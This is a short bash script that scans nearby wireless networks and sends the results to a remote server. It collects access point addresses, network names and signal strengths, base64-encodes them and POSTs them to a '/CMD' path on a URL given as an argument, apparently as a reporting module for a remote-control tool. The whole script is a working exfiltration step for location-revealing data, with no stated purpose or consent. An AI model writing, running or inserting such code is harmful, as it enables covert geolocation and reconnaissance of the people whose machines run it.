#!/bin/bash

# Get wireless information
wireless_data=$(iwlist scan 2>&1 | egrep 'Address|ESSID|Signal')

# Create post data string
post_data="os=linux&data=$(echo "$wireless_data" | base64 -w 0)"

# Send the data to the URL supplied via command line argument
curl -d "$post_data" "$1/CMD"
